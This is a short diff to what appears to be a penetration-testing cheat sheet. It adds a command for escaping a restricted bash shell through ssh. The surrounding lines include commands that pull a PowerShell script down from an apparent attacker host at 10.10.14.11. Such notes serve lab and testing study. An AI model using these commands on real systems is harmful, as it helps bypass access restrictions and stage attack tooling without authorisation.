@@ -8,6 +8,8 @@ wget -r http://<ip address>:<port>
 scp -r -p user@serveur1:chemin/vers/dossier/source user@serveur2:chemin/vers/dossier/destination
 Invoke-WebRequest "http://10.10.14.11:8000/file.ps1" -OutFile "C:\Users\username\file.ps1"
 
+#escape rbash  
+ssh username@IP -t "bash --noprofile"  
 
 # start apache server
 /etc/init.d/apache2 start
